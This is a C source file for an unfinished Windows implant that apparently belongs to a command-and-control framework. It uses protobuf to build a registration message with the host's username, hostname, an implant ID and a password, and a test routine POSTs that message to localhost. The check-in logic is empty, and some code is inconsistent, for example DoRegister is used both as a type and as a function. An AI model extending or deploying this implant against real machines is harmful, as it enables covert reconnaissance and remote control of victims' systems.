#define PB_ENABLE_MALLOC 1
#include <debug.h>
#include <windows.h>
#include <implant.h>
#include <execute.h>
#include <httpclient.h>
#include <pb_common.h>
#include <pb_decode.h>
#include <pb_encode.h>
#include <stdio.h>

#include "implant.pb.h"

LPBYTE ImplantID = NULL;

void test_pb() {
  DoRegister registerMessage = Register_init_zero;
  // stack variables (global, known before compile time)
  registerMessage.Password = "myPassword";
  registerMessage.GUID = "1234-5678-ABCD";
  registerMessage.Username = "user1";
  registerMessage.Hostname = "host.local";

  //  size_t out = 0;
  uint8_t buffer[4096];
  pb_ostream_t stream = pb_ostream_from_buffer(buffer, sizeof(buffer));

  bool status = pb_encode(&stream, Register_fields, &registerMessage);
  if (!status) {
    printf("Encoding failed: %s\n", PB_GET_ERROR(&stream));
  } // Adjust size as needed
  printf("wrote %llu\n", stream.bytes_written);
  // Decoding done, `registerMessage2` is now populated.

  size_t out_size = 0;
  LPBYTE result = HTTPRequest(L"POST", L"localhost", L"/testpb", 5000, L"test",
                              buffer, stream.bytes_written, &out_size, FALSE);
  printf("%s\n", result);
  if (out_size > 0) {
    free(result);
  }
  pb_istream_t istream = pb_istream_from_buffer(buffer, stream.bytes_written); // creates an input stream from buffer 

  DoRegister registerMessage2 = Register_init_zero;
  status = pb_decode(&istream, Register_fields, &registerMessage2);
  if (!status) {
    printf("Decoding failed: %s\n", PB_GET_ERROR(&istream));
    return;
  }
  printf("Decoded Password: %s\n", (char *)registerMessage2.Password);
  printf("Decoded GUID: %s\n", (char *)registerMessage2.GUID);
  printf("Decoded Username: %s\n", (char *)registerMessage2.Username);
  printf("Decoded Hostname: %s\n", (char *)registerMessage2.Hostname);
  // releases each pointer in struct Register
  pb_release(Register_fields, &registerMessage2);
  printf("Done!\n");
}

void SetImplantID() {
  ImplantID = (LPBYTE)malloc(17);
  for (int i = 0; i < 16; i++) {
    ImplantID[i] = 'a';
  }
  ImplantID[16] = '\0';
}

// register the implant
BOOL DoRegister() {
  Register reg = Register_init_zero;
  reg.GUID = ImplantID;
  // TODO lazy refactor do error checking
  DWORD dwSizeUser = MAX_PATH;
  DWORD dwSizeHostName = MAX_PATH;
  char username[MAX_PATH];
  GetUserNameA(username, &dwSizeUser);
  char hostname[MAX_PATH];
  GetComputerNameA(hostname, &dwSizeHostName);
  reg.Hostname = hostname;
  reg.Username = username;
  reg.Password = PASSWORD;

  size_t stRegSize = sizeof(Register) + strlen(ImplantID) + strlen(username) + strlen(hostname) + strlen(PASSWORD) + 4;
  return TRUE;
}

// checkin every X seconds
BOOL DoCheckin() {

  // be careful not to call pbrelease, as will free the GUID
}

void DoStartup() { SetImplantID(); }

// Username 
// Hostname
// GUID
int main() { 
  DEBUG_PRINTF("[+] Starting implant...\n")
  DoStartup();
  BOOL bRegisterResult = DoRegister();
  if (! bRegisterResult) {
    DEBUG_PRINTF("[!] Failed to Register with the server!\n");
    return 0;
  }
 }
